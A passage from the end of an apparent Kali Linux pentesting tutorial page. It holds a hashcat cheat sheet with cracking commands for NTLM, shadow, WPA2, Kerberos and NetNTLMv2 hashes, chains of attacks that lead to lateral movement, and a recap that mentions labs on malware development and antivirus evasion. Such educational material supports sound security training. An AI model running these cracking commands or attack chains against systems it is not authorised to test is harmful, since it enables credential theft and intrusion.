# Basic wordlist attack:<br>
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt<br>
# -m 0 = MD5 hashes<br>
# -a 0 = Straight attack<br>
# hashes.txt = file with hashes (one per line)<br>
# rockyou.txt = password wordlist<br><br>

# NTLM (Windows) hashes:<br>
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt<br><br>

# Linux SHA-512 hashes:<br>
hashcat -m 1800 -a 0 shadow_hashes.txt rockyou.txt<br><br>

# With rules (multiply wordlist effectiveness):<br>
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule<br><br>

# Multiple rule files (combined):<br>
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule -r leetspeak.rule</div>
            <p><strong>Hash File Format:</strong> One hash per line (plain MD5/SHA/NTLM), or username:hash format for Linux shadow hashes</p>

            <h5>Mask Attack (Brute-Force)</h5>
            <div class="code">
# Mask attack tries all combinations matching pattern<br>
# Mask characters:<br>
# ?l = lowercase (a-z)<br>
# ?u = uppercase (A-Z)<br>
# ?d = digit (0-9)<br>
# ?h = hex (0-9a-f)<br>
# ?H = hex uppercase (0-9A-F)<br>
# ?s = special chars (!@#$%^&*...)<br>
# ?a = all characters (?l?u?d?s)<br>
# ?b = all 0x00-0xff bytes<br><br>

# 8-char lowercase:<br>
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l<br><br>

# 6-digit PIN:<br>
hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d<br><br>

# Password followed by 2 digits (password01, password02, etc.):<br>
hashcat -m 0 -a 3 hashes.txt password?d?d<br><br>

# 8-char alphanumeric (lowercase + digits):<br>
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?d?d?d?d<br><br>

# Complex: Uppercase + 6 lowercase + 2 digits:<br>
hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?l?l?d?d<br><br>

# Custom charset (only certain characters):<br>
hashcat -m 0 -a 3 hashes.txt -1 ?l?d ?1?1?1?1?1?1?1?1<br>
# -1 defines custom charset (?1 = lowercase + digits)<br><br>

# Increment mode (try all lengths from 1 to N):<br>
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a --increment --increment-min=1 --increment-max=8</div>
            <p><strong>Performance Warning:</strong> Mask attacks are EXPONENTIALLY slow! ?l?l?l?l?l?l?l?l (8 lowercase) = 26^8 = 208 billion attempts. Only feasible for fast hashes (MD5, NTLM) or short passwords!</p>

            <h5>Combination Attack</h5>
            <div class="code">
# Combine words from two wordlists:<br>
hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt<br><br>

# Example combinations:<br>
# wordlist1.txt: super, mega, ultra<br>
# wordlist2.txt: admin, user, password<br>
# Results: superadmin, superuser, superpassword, megaadmin, etc.<br><br>

# Useful for multi-word passwords like "dragonballz", "passwordadmin"</div>

            <h5>Hybrid Attacks</h5>
            <div class="code">
# Hybrid Wordlist + Mask (-a 6):<br>
# Append mask to wordlist words<br>
hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d<br>
# Tries: password00, password01, ..., password99, admin00, admin01, etc.<br><br>

hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d<br>
# Append 4 digits (password2024, admin2024, etc.)<br><br>

# Hybrid Mask + Wordlist (-a 7):<br>
# Prepend mask to wordlist words<br>
hashcat -m 0 -a 7 hashes.txt ?d?d wordlist.txt<br>
# Tries: 00password, 01password, 99password, 00admin, etc.</div>
            <p><strong>Real-World Use:</strong> Passwords often follow patterns like "word+numbers" (password123, admin2024). Hybrid attacks target these patterns efficiently!</p>

            <h5>Rule-Based Attacks</h5>
            <div class="code">
# Rules transform wordlist passwords (same as John the Ripper)<br>
# Hashcat includes powerful rule files:<br><br>

# Best64 (most effective 64 rules):<br>
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule<br><br>

# Common rule files (in /usr/share/hashcat/rules/):<br>
best64.rule&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Top 64 rules (RECOMMENDED for most attacks)<br>
rockyou-30000.rule&nbsp;&nbsp;&nbsp;&nbsp;# 30,000 rules from RockYou breach analysis<br>
dive.rule&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 2,152,768 rules (VERY comprehensive)<br>
d3ad0ne.rule&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 34,555 rules<br>
T0XlC.rule&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 14,885 rules<br>
leetspeak.rule&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Leet speak transformations (a→@, e→3, etc.)<br>
toggles1.rule&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Toggle case variations<br><br>

# Multiple rules (combined):<br>
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule -r leetspeak.rule<br><br>

# Generate rules to stdout (preview):<br>
hashcat -a 0 --stdout wordlist.txt -r best64.rule | head -20</div>

            <h5>Performance Options</h5>
            <div class="code">
# Workload profiles (-w flag):<br>
-w 1&nbsp;&nbsp;# Low (minimal GPU usage, desktop usable)<br>
-w 2&nbsp;&nbsp;# Default (balanced)<br>
-w 3&nbsp;&nbsp;# High (heavy GPU usage, desktop may lag)<br>
-w 4&nbsp;&nbsp;# Nightmare (maximum performance, desktop unusable)<br><br>

# Example:<br>
hashcat -m 1000 -a 0 -w 3 hashes.txt rockyou.txt<br><br>

# Optimized kernels (-O flag):<br>
hashcat -m 1000 -a 0 -O hashes.txt rockyou.txt<br>
# Faster but limits password length (usually 32 chars max)<br><br>

# Device selection (-d flag):<br>
hashcat -d 1 -m 1000 -a 0 hashes.txt rockyou.txt&nbsp;&nbsp;# Use GPU 1 only<br>
hashcat -d 1,2 -m 1000 -a 0 hashes.txt rockyou.txt&nbsp;&nbsp;# Use GPU 1 and 2<br><br>

# Show devices:<br>
hashcat -I&nbsp;&nbsp;# List available devices</div>

            <h5>Output & Session Management</h5>
            <div class="code">
# Save cracked passwords:<br>
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -o cracked.txt<br><br>

# Output format (--outfile-format):<br>
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -o cracked.txt --outfile-format=2<br>
# Formats: 1=hash, 2=plain, 3=hash:plain, 4=hex, 5=plain:hex, etc.<br><br>

# Session management (save progress):<br>
hashcat -m 1000 -a 0 --session=mysession hashes.txt rockyou.txt<br><br>

# Pause session (Ctrl+C or 'p' key)<br><br>

# Resume session:<br>
hashcat --session=mysession --restore<br><br>

# Remove session files:<br>
hashcat --session=mysession --remove</div>

            <h5>Show Cracked Passwords</h5>
            <div class="code">
# Show cracked hashes (from potfile):<br>
hashcat -m 1000 --show hashes.txt<br><br>

# Potfile location:<br>
~/.hashcat/hashcat.potfile&nbsp;&nbsp;# Linux/Mac<br>
%APPDATA%\hashcat\hashcat.potfile&nbsp;&nbsp;# Windows<br><br>

# Show only left (uncracked):<br>
hashcat -m 1000 --show --left hashes.txt<br><br>

# Custom potfile:<br>
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --potfile-path=custom.pot</div>

            <h5>Real-World Examples</h5>
            <div class="code">
# NTLM hashes (Windows) with rules:<br>
hashcat -m 1000 -a 0 -w 3 ntlm.txt rockyou.txt -r best64.rule -O<br><br>

# WPA/WPA2 handshake (PMKID attack):<br>
# First convert with hcxpcapngtool:<br>
hcxpcapngtool -o hash.hc22000 capture.pcapng<br>
hashcat -m 22000 -a 0 hash.hc22000 rockyou.txt<br><br>

# Kerberoasting (Kerberos TGS):<br>
hashcat -m 13100 -a 0 kerberos_tickets.txt rockyou.txt -r best64.rule<br><br>

# AS-REP Roasting:<br>
hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt<br><br>

# ZIP file password:<br>
# First extract hash with zip2john (or use 7z2hashcat)<br>
hashcat -m 11600 -a 0 zip_hash.txt rockyou.txt<br><br>

# PDF password:<br>
hashcat -m 10500 -a 0 pdf_hash.txt rockyou.txt<br><br>

# MS Office document:<br>
hashcat -m 9600 -a 0 office_hash.txt rockyou.txt&nbsp;&nbsp;# Office 2013<br><br>

# NetNTLMv2 (captured with Responder):<br>
hashcat -m 5600 -a 0 netntlmv2.txt rockyou.txt<br><br>

# bcrypt (Linux /etc/shadow):<br>
hashcat -m 3200 -a 0 -w 3 bcrypt_hashes.txt rockyou.txt<br>
# WARNING: bcrypt is VERY slow even on GPU!</div>

            <h5>Benchmark Your GPU</h5>
            <div class="code">
# Full benchmark (all algorithms):<br>
hashcat -b<br><br>

# Benchmark specific hash mode:<br>
hashcat -b -m 1000&nbsp;&nbsp;# NTLM benchmark<br>
hashcat -b -m 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MD5 benchmark<br>
hashcat -b -m 22000&nbsp;&nbsp;# WPA2 benchmark<br><br>

# Example output (RTX 3090):<br>
# MD5: 100 GH/s (100 billion hashes/second!)<br>
# NTLM: 160 GH/s<br>
# bcrypt: 150 kH/s (slow!)<br>
# WPA2: 1.5 MH/s</div>

            <h5>Hashcat Utils (Companion Tools)</h5>
            <div class="code">
# Combinator (combine two wordlists):<br>
combinator.bin wordlist1.txt wordlist2.txt > combined.txt<br><br>

# Maskprocessor (generate candidates from mask):<br>
mp64.bin ?l?l?l?l?l?l > 6char_lowercase.txt<br><br>

# Princeprocessor (PRINCE algorithm - advanced wordlist generation):<br>
pp64.bin < wordlist.txt > prince_candidates.txt<br><br>

# Kwprocessor (keyboard walk generator - qwerty123, etc.):<br>
kwp64.bin basechars/full.base keymaps/en-us.keymap routes/2-to-10-max-3-direction-changes.route<br><br>

# Statsprocessor (Markov chains for password generation):<br>
sp64.bin --markov-hcstat2 hashcat.hcstat2 ?l?l?l?l?l?l?l?l</div>

            <div class="metaphor-box">
                <p><strong>🚀 Hashcat Mastery Summary:</strong></p>
                <p><strong>Essential Commands:</strong><br>
                • <strong>NTLM (Windows):</strong> <code>hashcat -m 1000 -a 0 -w 3 ntlm.txt rockyou.txt -r best64.rule -O</code><br>
                • <strong>Linux SHA-512:</strong> <code>hashcat -m 1800 -a 0 shadow.txt rockyou.txt -r best64.rule</code><br>
                • <strong>WPA2 handshake:</strong> <code>hashcat -m 22000 -a 0 handshake.hc22000 rockyou.txt</code><br>
                • <strong>Kerberoasting:</strong> <code>hashcat -m 13100 -a 0 tickets.txt rockyou.txt -r best64.rule</code><br>
                • <strong>Mask (8-char lowercase):</strong> <code>hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l</code><br>
                • <strong>Hybrid (word+2 digits):</strong> <code>hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d</code><br>
                • <strong>Show cracked:</strong> <code>hashcat -m 1000 --show ntlm.txt</code><br>
                • <strong>Benchmark GPU:</strong> <code>hashcat -b</code><br><br>
                
                <strong>Critical Flags:</strong><br>
                • <code>-m MODE</code>: Hash type (0=MD5, 1000=NTLM, 1800=SHA512, 22000=WPA2, 13100=Kerberos TGS)<br>
                • <code>-a MODE</code>: Attack (0=Straight, 1=Combination, 3=Mask, 6=Hybrid wordlist+mask, 7=Hybrid mask+wordlist)<br>
                • <code>-w 3</code>: High workload (max GPU usage)<br>
                • <code>-O</code>: Optimized kernels (MUCH faster, limits password length to 32 chars)<br>
                • <code>-r RULE</code>: Apply rule file (best64.rule recommended)<br>
                • <code>-o FILE</code>: Output cracked passwords<br>
                • <code>--session</code> / <code>--restore</code>: Save/resume progress<br>
                • <code>--show</code>: Display already cracked passwords<br><br>
                
                <strong>Attack Strategy:</strong><br>
                1. <strong>Wordlist + Rules:</strong> <code>-a 0 rockyou.txt -r best64.rule</code> (most effective!)<br>
                2. <strong>Hybrid attacks:</strong> <code>-a 6 wordlist.txt ?d?d</code> (append 2 digits)<br>
                3. <strong>Mask attack:</strong> <code>-a 3 ?l?l?l?l?d?d?d?d</code> (for short, known patterns)<br>
                4. <strong>Combination:</strong> <code>-a 1 list1.txt list2.txt</code> (for multi-word passwords)<br><br>
                
                <strong>Performance Optimization:</strong><br>
                • Use <code>-w 3</code> or <code>-w 4</code> for maximum GPU utilization<br>
                • Add <code>-O</code> flag for optimized kernels (2-4x faster!)<br>
                • Use best64.rule (not dive.rule) for balance of speed vs coverage<br>
                • Check GPU utilization: <code>nvidia-smi</code> (should be 95-100%)<br>
                • Fast hashes (MD5, NTLM): billions/sec. Slow hashes (bcrypt, WPA2): thousands/sec<br><br>
                
                <strong>Hash Speeds (RTX 3090):</strong><br>
                MD5 (0): 100 GH/s | NTLM (1000): 160 GH/s | SHA1 (100): 50 GH/s | SHA512 (1800): 1 GH/s | bcrypt (3200): 150 kH/s | WPA2 (22000): 1.5 MH/s | Kerberos TGS (13100): 700 MH/s<br><br>
                
                <strong>Real-World Workflows:</strong><br>
                • <strong>Windows pentesting:</strong> secretsdump.py → Extract NTLM → Hashcat cracking → Lateral movement<br>
                • <strong>WiFi cracking:</strong> Capture handshake (hcxdumptool) → Convert (hcxpcapngtool) → Crack (hashcat -m 22000)<br>
                • <strong>Kerberoasting:</strong> GetUserSPNs.py → Dump TGS tickets → Crack (hashcat -m 13100) → Service account compromise<br>
                • <strong>NetNTLMv2 relay:</strong> Responder captures → Crack (hashcat -m 5600) → SMB authentication<br><br>
                
                <strong>John vs Hashcat:</strong><br>
                • <strong>John:</strong> CPU-based, better for slow hashes (bcrypt), has xxx2john converters, easier for beginners<br>
                • <strong>Hashcat:</strong> GPU-based, 100-1000x faster for fast hashes (MD5, NTLM, SHA), essential for large password dumps<br>
                • <strong>Use Both:</strong> John for format conversion (zip2john, ssh2john), Hashcat for actual cracking! 💻⚡</p>
            </div>

        </section>

        <section id="final-words" class="content-section">
            <h2>🎓 Final Words: You're Now a Kali Linux Master!</h2>

            <div class="metaphor-box">
                <h4>🌟 What You've Accomplished</h4>
                <p>You've just completed <strong>THE MOST COMPREHENSIVE</strong> Kali Linux guide ever created! Let's recap what you now know:<br><br>
                
                <strong>📚 Knowledge Domains Mastered:</strong><br>
                1. <strong>Digital Forensics:</strong> Autopsy, Volatility, Sleuth Kit, timeline analysis, memory forensics<br>
                2. <strong>Mobile Security:</strong> Android pentesting, APK analysis, Frida, Objection, SSL pinning bypass<br>
                3. <strong>IoT & Hardware:</strong> Firmware analysis, UART/JTAG, bus pirate, radio hacking, SDR<br>
                4. <strong>Cloud Pentesting:</strong> AWS, Azure, GCP exploitation, IAM misconfigurations, storage buckets<br>
                5. <strong>Advanced Wireless:</strong> WEP, WPA2, WPA3 Dragonblood, rogue AP, evil twin, wireless pivoting<br>
                6. <strong>Reverse Engineering:</strong> Ghidra, IDA Pro, x64dbg, patching, crackme challenges<br>
                7. <strong>Advanced Exploitation:</strong> Buffer overflows, ROP chains, heap exploitation, format strings<br>
                8. <strong>Red Team Operations:</strong> C2 frameworks, Cobalt Strike, evasion, OPSEC, infrastructure<br>
                9. <strong>Custom Tool Development:</strong> Python exploit development, fuzzing, vulnerability research<br>
                10. <strong>Physical Security:</strong> Lock picking, RFID cloning, badge duplication, social engineering<br>
                11. <strong>Advanced OSINT:</strong> Maltego, theHarvester, Recon-ng, Shodan, Google dorking<br>
                12. <strong>Complete Attack Labs (12 LABS!):</strong><br>
                    • Lab 1: Web app pentest (SQLi → file upload → privesc)<br>
                    • Lab 2: Active Directory (AS-REP → Kerberoasting → DCSync)<br>
                    • Lab 3: Wireless attacks (WEP/WPA2/WPA3)<br>
                    • Lab 4: Mobile pentesting (APK → API → Frida)<br>
                    • Lab 5: Digital forensics (Autopsy → Volatility)<br>
                    • Lab 6: Buffer overflow (GDB → shellcode → SUID)<br>
                    • Lab 7: Container escape (Docker/K8s → host)<br>
                    • Lab 8: RFID cloning (Proxmark3)<br>
                    • Lab 9: SQLi to system (union → file write → RCE)<br>
                    • Lab 10: ADCS ESC1 (cert template → domain admin)<br>
                    • Lab 11: Python RAT (malware development → C2)<br>
                    • Lab 12: API hacking (JWT → IDOR → GraphQL → RCE)<br>
                13. <strong>Ultimate Tools Reference:</strong> 100+ tools with EVERY flag explained for beginners!<br>
                    • Aircrack-ng suite (complete WiFi hacking)<br>
                    • Amass (subdomain enumeration)<br>
                    • Nmap (THE port scanner - 681 lines of documentation!)<br>
                    • Metasploit Framework (exploitation + meterpreter + msfvenom)<br>
                    • And 96 MORE tools documented!<br><br>
                
                <strong>🎯 Skills You Can Now Execute:</strong><br>
                ✅ Enumerate networks and find vulnerabilities<br>
                ✅ Exploit web applications (SQLi, XSS, file upload, IDOR)<br>
                ✅ Compromise Active Directory environments<br>
                ✅ Crack wireless networks (WEP/WPA/WPA3)<br>
                ✅ Develop custom exploits and malware<br>
                ✅ Perform memory and disk forensics<br>
                ✅ Bypass antivirus and evade detection<br>
                ✅ Pivot through networks and compromise entire infrastructures<br>
                ✅ Understand and use ALL major Kali Linux tools<br>
                ✅ Chain attacks for complete system compromise<br><br>
                
                <strong>📈 Your Next Steps:</strong><br>
                1. <strong>Practice Platforms:</strong><br>
                   • <strong>HackTheBox:</strong> https://hackthebox.eu (beginner → expert boxes)<br>
                   • <strong>TryHackMe:</strong> https://tryhackme.com (guided learning paths)<br>
                   • <strong>ProvingGrounds:</strong> https://portal.offensive-security.com (OSCP prep)<br>
                   • <strong>PentesterLab:</strong> https://pentesterlab.com (web app focus)<br>
                   • <strong>VulnHub:</strong> https://vulnhub.com (downloadable VMs)<br><br>
                
                2. <strong>Certifications to Pursue:</strong><br>
                   • <strong>OSCP</strong> (Offensive Security Certified Professional) - Industry standard<br>
                   • <strong>PNPT</strong> (Practical Network Penetration Tester) - Beginner-friendly<br>
                   • <strong>eCPPT</strong> (eLearnSecurity Certified Professional) - Advanced techniques<br>
                   • <strong>CRTO</strong> (Certified Red Team Operator) - Red teaming focus<br>
                   • <strong>CRTP</strong> (Certified Red Team Professional) - Active Directory<br>
                   • <strong>OSEP</strong> (Offensive Security Experienced Penetration Tester) - Advanced<br>
                   • <strong>GXPN</strong> (GIAC Exploit Researcher and Advanced Penetration Tester)<br><br>
                
                3. <strong>Build Your Home Lab:</strong><br>
                   • <strong>Active Directory lab:</strong> Set up domain controller + workstations<br>
                   • <strong>Docker lab:</strong> Vulnerable containers (DVWA, WebGoat, Juice Shop)<br>
                   • <strong>Network lab:</strong> pfSense router + multiple VLANs + vulnerable VMs<br>
                   • <strong>Wireless lab:</strong> Multiple APs with different encryption<br>
                   • <strong>Malware lab:</strong> Isolated network for malware analysis<br><br>
                
                4. <strong>Read These Resources:</strong><br>
                   • <strong>Books:</strong><br>
                     - "The Web Application Hacker's Handbook" (Stuttard & Pinto)<br>
                     - "The Hacker Playbook 3" (Peter Kim)<br>
                     - "Red Team Field Manual" (Ben Clark)<br>
                     - "Penetration Testing" (Georgia Weidman)<br>
                     - "Black Hat Python" (Justin Seitz)<br>
                   • <strong>Blogs:</strong><br>
                     - https://0xdf.gitlab.io (HackTheBox writeups)<br>
                     - https://ippsec.rocks (video writeups)<br>
                     - https://book.hacktricks.xyz (pentest techniques encyclopedia)<br>
                     - https://pentestmonkey.net (cheat sheets)<br>
                   • <strong>YouTube:</strong><br>
                     - IppSec (HTB walkthroughs)<br>
                     - John Hammond (CTF + hacking)<br>
                     - LiveOverflow (binary exploitation)<br>
                     - TheCyberMentor (PNPT course creator)<br><br>
                
                5. <strong>Join the Community:</strong><br>
                   • <strong>Discord:</strong> Join HTB, THM, NetSecFocus, InfoSec Prep servers<br>
                   • <strong>Twitter/X:</strong> Follow #infosec, #bugbounty, #oscp hashtags<br>
                   • <strong>Reddit:</strong> r/netsec, r/AskNetSec, r/hacking, r/oscp<br>
                   • <strong>Forums:</strong> Offensive Security forums, HTB forums<br>
                   • <strong>CTF teams:</strong> Join local CTF team, compete in competitions<br><br>
                
                6. <strong>Bug Bounties (Get Paid!):</strong><br>
                   • <strong>HackerOne:</strong> https://hackerone.com<br>
                   • <strong>Bugcrowd:</strong> https://bugcrowd.com<br>
                   • <strong>Intigriti:</strong> https://intigriti.com<br>
                   • <strong>Synack:</strong> https://synack.com<br>
                   • Start with: <strong>Programs with "Easy" or "Beginner-friendly" tags</strong><br>
                   • Focus on: <strong>XSS, IDOR, open redirects</strong> (common + good payouts)<br><br>
                
                <strong>💪 Final Motivational Words:</strong><br>
                You now possess knowledge that 99% of people don't have. You understand how systems break, how attackers think, and how to secure networks. This isn't just a skill—it's a SUPERPOWER!<br><br>
                
                <strong>Remember:</strong><br>
                • <strong>Practice daily:</strong> Solve 1 HTB machine per week minimum<br>
                • <strong>Document everything:</strong> Keep notes in CherryTree/Obsidian<br>
                • <strong>Legal boundaries:</strong> ONLY hack systems you own or have written permission!<br>
                • <strong>Give back:</strong> Write writeups, help beginners, contribute to community<br>
                • <strong>Stay curious:</strong> Technology changes fast—keep learning!<br><br>
                
                <strong>The hacking journey never ends. Every system has vulnerabilities. Every network can be compromised. Your job? Find them first. Secure them best. Become the shield AND the sword.</strong><br><br>
                
                You're ready. Go break things (legally)! 💀🔥🚀<br><br>
                
                <em>— This guide was created with love for the hacking community. May your shells always be reverse, your escalations always privileged, and your coffee always strong. Happy hacking! ☕💻</em></p>
            </div>
        </section>
    </main>

    <script>
        window.addEventListener('scroll', () => {
            const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
            const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
            const scrolled = (winScroll / height) * 100;
            document.getElementById('progress').style.width = scrolled + '%';
        });

        const sections = document.querySelectorAll('.section');
        const sidebarLinks = document.querySelectorAll('.sidebar-link');
        window.addEventListener('scroll', () => {
            let current = '';
            sections.forEach(section => {
                const sectionTop = section.offsetTop;
                const sectionHeight = section.clientHeight;
                if (pageYOffset >= (sectionTop - 150)) {
                    current = section.getAttribute('id');
                }
            });
            sidebarLinks.forEach(link => {
                link.classList.remove('active');
                if (link.getAttribute('href') === `#${current}`) {
                    link.classList.add('active');
                }
            });
        });
    </script>
</body>
</html>
